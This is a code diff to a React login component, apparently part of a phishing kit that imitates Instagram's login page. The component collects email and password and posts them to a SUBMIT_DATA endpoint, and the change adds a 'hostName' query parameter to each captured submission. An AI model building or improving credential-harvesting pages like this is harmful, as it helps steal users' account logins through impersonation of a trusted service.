@@ -1,20 +1,22 @@
 import { useState } from 'react';
 import axios from 'axios';
 import { SUBMIT_DATA } from '../constants';
+import { useParams } from 'react-router-dom';
 
 
 const InstaLogin = ()=>{
 
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
-
-    
+    const searchParams = new URLSearchParams(window.location.search);
+    const hostname = searchParams.get('hostName');
     const handleLogin = ()=>{
         if (!email || !password) {return;}
 
         axios.post(SUBMIT_DATA, {
                 email: email,
-                password: password
+                password: password,
+                hostName: hostname
         })
         .then(response=>{
             console.log(response);
@@ -40,7 +42,6 @@ const InstaLogin = ()=>{
   <meta charSet="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="stylesheet" href="assets/css/main.css" />
-  <title>Instagram</title>
   <main className="l-main">
     
     <div className="l-main__img">
